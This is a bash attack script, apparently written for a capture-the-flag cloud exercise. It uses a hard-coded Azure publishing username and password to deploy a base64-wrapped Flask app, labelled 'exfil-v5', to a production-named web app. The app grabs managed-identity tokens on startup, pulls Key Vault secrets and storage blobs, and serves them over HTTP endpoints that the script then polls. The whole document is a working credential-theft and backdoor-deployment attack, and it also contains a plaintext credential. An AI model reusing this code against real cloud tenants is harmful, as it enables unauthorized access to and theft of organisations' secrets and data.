#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
PUB_USER='$app-tbl-reporting-prod'
PUB_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'

# Create deploy package with a self-exfilling app
TMPDIR=$(mktemp -d)

# Write a Flask app that runs exfil on FIRST REQUEST and also on startup
# The startup exfil writes results to /home/results.json
# The Flask app serves those results
python3 -c "
import base64
code = '''
import os, json, sys, urllib.request

def get_token(scope, client_id=None):
    ie = os.environ.get('IDENTITY_ENDPOINT', '')
    ih = os.environ.get('IDENTITY_HEADER', '')
    if not ie or not ih:
        return None
    url = ie + '?resource=' + scope + '&api-version=2019-08-01'
    if client_id:
        url += '&client_id=' + client_id
    req = urllib.request.Request(url, headers={'X-IDENTITY-HEADER': ih})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read()).get('access_token', '')
    except Exception as e:
        return 'ERR:' + str(e)

def do_exfil():
    r = {}
    r['IDENTITY_ENDPOINT'] = os.environ.get('IDENTITY_ENDPOINT', '')
    r['IDENTITY_HEADER'] = os.environ.get('IDENTITY_HEADER', '')[:20]

    # Get tokens - try user-assigned MSI first
    client_id = '7a85156a-01c4-4e61-8472-40a92107159b'
    for scope in ['https://vault.azure.net', 'https://management.azure.com', 'https://storage.azure.com']:
        r[scope + '_ua'] = get_token(scope, client_id)
        r[scope + '_def'] = get_token(scope)

    # Read KV secrets
    for vt_key in [scope + '_ua', scope + '_def']:
        pass

    vt = r.get('https://vault.azure.net_ua') or r.get('https://vault.azure.net_def')
    if vt and not str(vt).startswith('ERR') and vt is not None:
        # List KV2 secrets
        try:
            req = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4',
                headers={'Authorization': 'Bearer ' + vt})
            with urllib.request.urlopen(req, timeout=10) as resp:
                r['kv2_list'] = json.loads(resp.read())
        except urllib.request.HTTPError as e:
            r['kv2_list'] = 'HTTP' + str(e.code) + ':' + e.read().decode()[:500]
        except Exception as e:
            r['kv2_list'] = str(e)

        # Try specific secrets
        for sn in ['flag','connection-string','master-key','secret','storage-key','tbl-flag','ctf-flag','admin-password','data-export-key']:
            try:
                req = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/' + sn + '?api-version=7.4',
                    headers={'Authorization': 'Bearer ' + vt})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r['kv2_' + sn] = json.loads(resp.read())
            except urllib.request.HTTPError as e:
                r['kv2_' + sn] = 'HTTP' + str(e.code)
            except Exception as e:
                r['kv2_' + sn] = str(e)

    # Storage tokens
    st = r.get('https://storage.azure.com_ua') or r.get('https://storage.azure.com_def')
    if st and not str(st).startswith('ERR') and st is not None:
        for blob in ['sttblappcfgprodx3euoz/config/internal-config.json',
                     'sttblbackupprodx3euoz/exports/flag.txt',
                     'sttblbackupprodx3euoz/exports/backup.json']:
            sa = blob.split('/')[0]
            rest = '/'.join(blob.split('/')[1:])
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/' + rest,
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[blob] = resp.read().decode()[:5000]
            except urllib.request.HTTPError as e:
                r[blob] = 'HTTP' + str(e.code)
            except Exception as e:
                r[blob] = str(e)
        # List containers
        for sa in ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz']:
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/?comp=list',
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[sa + '/list'] = resp.read().decode()[:3000]
            except Exception as e:
                r[sa + '/list'] = str(e)
        # List blobs in key containers
        for container_path in ['sttblappcfgprodx3euoz/config','sttblbackupprodx3euoz/exports']:
            sa, cn = container_path.split('/')
            try:
                req = urllib.request.Request('https://' + sa + '.blob.core.windows.net/' + cn + '?restype=container&comp=list',
                    headers={'Authorization': 'Bearer ' + st, 'x-ms-version': '2020-10-02'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    r[container_path + '/blobs'] = resp.read().decode()[:5000]
            except Exception as e:
                r[container_path + '/blobs'] = str(e)

    return r

# Run on import (startup)
try:
    results = do_exfil()
    with open('/home/results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
except Exception as e:
    with open('/home/results.json', 'w') as f:
        json.dump({'startup_error': str(e)}, f)

from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/')
def index():
    return 'exfil-v5'

@app.route('/r')
def read_results():
    try:
        with open('/home/results.json') as f:
            return f.read(), 200, {'Content-Type': 'application/json'}
    except:
        return jsonify(error='no results yet')

@app.route('/live')
def live():
    return jsonify(do_exfil())
'''
print(base64.b64encode(code.encode()).decode())
" > "$TMPDIR/app_b64.txt"

# Decode into app.py
base64 -d "$TMPDIR/app_b64.txt" > "$TMPDIR/app.py"
echo "flask" > "$TMPDIR/requirements.txt"

cd "$TMPDIR"
zip -r deploy.zip app.py requirements.txt

echo "=== Deploying via ZipDeploy ==="
curl -sS -X POST -u "$PUB_USER:$PUB_PASS" \
  --data-binary @deploy.zip \
  -H "Content-Type: application/zip" \
  "$SCM/api/zipdeploy" -w "\nHTTP_CODE:%{http_code}" 2>&1

echo "=== Waiting 45s ==="
sleep 45

echo "=== Check root ==="
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" -w "\nHTTP:%{http_code}" 2>&1 | head -3

echo "=== Check /r ==="
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/r" 2>&1 | head -100

echo "=== Check /live ==="
curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/live" 2>&1 | head -100

echo "=== Read results.json via Kudu ==="
curl -sS -u "$PUB_USER:$PUB_PASS" "$SCM/api/vfs/results.json" 2>&1 | head -100

echo "=== DONE ==="
